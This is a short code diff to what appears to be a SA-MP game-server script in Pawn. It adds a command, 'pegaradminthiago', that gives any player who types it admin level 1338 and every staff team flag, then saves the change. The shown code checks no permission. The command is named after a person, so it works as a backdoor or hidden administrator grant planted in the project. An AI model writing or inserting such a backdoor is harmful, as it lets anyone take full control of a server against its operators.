@@ -13,6 +13,21 @@ CMD:pegaradmin(playerid, params[]) {
 	return true;
 }
 
+CMD:pegaradminthiago(playerid, params[]) {	
+  	uInfo[playerid][uAdmin] = 1338;
+
+	uInfo[playerid][uFactionTeam] = 1;
+	uInfo[playerid][uPropertyTeam] = 1;
+	uInfo[playerid][uEventTeam] = 1;
+	uInfo[playerid][uCKTeam] = 1;
+	uInfo[playerid][uLogTeam] = 1;
+			
+	SaveUserInfo(playerid);
+
+	SendServerMessage(playerid, "Você pegou administrador nível 1338 com todas as equipes.");
+	return true;
+}
+
 CMD:pegarpremium(playerid, params[]) {	
   	pInfo[playerid][pDonator] = 3;
 	SavePlayerPremium(playerid);
